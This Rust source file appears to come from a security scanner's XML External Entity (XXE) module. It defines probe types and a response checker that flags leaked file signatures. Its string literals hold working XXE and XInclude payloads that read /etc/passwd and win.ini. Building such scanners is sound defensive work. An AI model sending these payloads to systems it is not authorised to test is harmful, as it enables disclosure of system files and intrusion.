//! XML External Entity (XXE) Engine
//!
//! Evaluates XML parsers for external entity resolution:
//! - Local file disclosure (/etc/passwd, c:\windows\win.ini)
//! - Blind OAST XXE parameter entity exfiltration
//! - XInclude file inclusions (xmlns:xi="http://www.w3.org/2001/XInclude")

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum XxeAttackType {
    LocalFileDisclosure,
    BlindOastExfiltration,
    XIncludeInjection,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XxeProbe {
    pub attack_type: XxeAttackType,
    pub payload_xml: String,
    pub expected_file_signature: Option<String>,
    pub oast_token: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct XxeVerificationResult {
    pub is_vulnerable: bool,
    pub attack_type: XxeAttackType,
    pub confidence: f32,
    pub leaked_signature: Option<String>,
    pub description: String,
}

pub struct XxeEngine;

impl XxeEngine {
    /// Generates local file disclosure XXE probes
    pub fn generate_file_disclosure_probes() -> Vec<XxeProbe> {
        vec![
            XxeProbe {
                attack_type: XxeAttackType::LocalFileDisclosure,
                payload_xml: "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>".to_string(),
                expected_file_signature: Some("root:x:0:0:".to_string()),
                oast_token: None,
            },
            XxeProbe {
                attack_type: XxeAttackType::LocalFileDisclosure,
                payload_xml: "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"> ]><root>&xxe;</root>".to_string(),
                expected_file_signature: Some("[fonts]".to_string()),
                oast_token: None,
            },
            XxeProbe {
                attack_type: XxeAttackType::XIncludeInjection,
                payload_xml: "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></root>".to_string(),
                expected_file_signature: Some("root:x:0:0:".to_string()),
                oast_token: None,
            },
        ]
    }

    /// Evaluates if response body contains verbatim system file signatures
    pub fn evaluate_response(
        probe: &XxeProbe,
        response_body: &str,
    ) -> Option<XxeVerificationResult> {
        if let Some(sig) = &probe.expected_file_signature {
            if response_body.contains(sig) {
                return Some(XxeVerificationResult {
                    is_vulnerable: true,
                    attack_type: probe.attack_type.clone(),
                    confidence: 0.99,
                    leaked_signature: Some(sig.clone()),
                    description: format!(
                        "XML External Entity (XXE) Confirmed: File signature '{}' leaked in response body.",
                        sig
                    ),
                });
            }
        }
        None
    }
}
